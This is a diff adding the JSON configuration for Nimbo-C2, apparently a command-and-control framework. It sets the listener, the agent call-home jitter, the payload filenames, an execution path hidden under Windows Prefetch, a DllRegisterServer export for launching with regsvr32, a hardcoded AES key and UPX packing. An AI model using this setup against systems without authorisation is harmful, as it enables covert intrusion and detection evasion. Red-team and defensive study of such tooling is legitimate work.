@@ -1,0 +1,81 @@
+{
+    "listener":
+    {
+        // currently only http protocol is supported
+        "scheme": "http",
+        // socket your listener will listen on
+        "listen_on_address": "0.0.0.0",
+        "listen_on_port": 80,
+        // your actual c2 address
+        "address": "localhost",
+        "port": 80
+    },
+    "agent":
+    {
+        // seconds to sleep after no-tasks call-home
+        "call_home_timeframe": 1,
+        // jitter in percent of call-home timeframe
+        // for 10 seconds timeframe and 50% jitter - the agent will call home between 5 to 15 seconds
+        "call_home_jitter_percent": 1,
+        // seconds to sleep after initial execution
+        "sleep_on_execution": 0,
+        "exe":
+        {
+            // default exe filename - can be override (use build exe -h)
+            "agent_filename": "na.exe",
+            // path to be copied and executed from
+            "execution_path": "C:\\\\ProgramData\\\\Prefetch\\\\na.exe"
+        },
+        "dll":
+        {
+            // default dll filename - can be override (use build dll -h)
+            "agent_filename": "na.dll",
+            // default dll export name - can be override (use build dll -h)
+            // using this export name - nice to execute using regsvr32 <dll-path>
+            "export_name": "DllRegisterServer"
+        }
+    },
+    "communication":
+    {
+        // you'll probably want to change this
+        // aes_key length = 32 chars
+        "aes_key": "Nimbo-C2 w1ll r0ck y0ur w0rld :)",
+        // aes_iv length = 16 chars
+        "aes_iv": "----------------"
+    },
+    "c2":
+    {
+        "logging":
+        {
+            // whether to log agent call homes data to a file
+            "log_to_file": false,
+            // log to this file
+            "log_file": "Nimbo-C2.log"
+        },
+        "save_agents_data":
+        {
+            // whether to persist agent data between executions
+            "save_on_exit": false,
+            // log to this file
+            "save_path": "agents_data.json"
+        },
+        // python-prompt-toolkit prompt colors
+        "prompt":
+        {
+            "agent_prompt_color": "Crimson",
+            "nimbo_prompt_color": "Aqua"
+        },
+        "general":
+        {
+            // whether to start the listener on Nimbo-C2.py execution
+            "start_listener_on_start": true,
+            // collect agents data to this folder
+            "collect_folder": "collected"
+        }
+    },
+    "builder":
+    {
+        // define your local UPX binary path or define simple "upx" if installed and in path
+        "upx_path": "upx"
+    }
+}
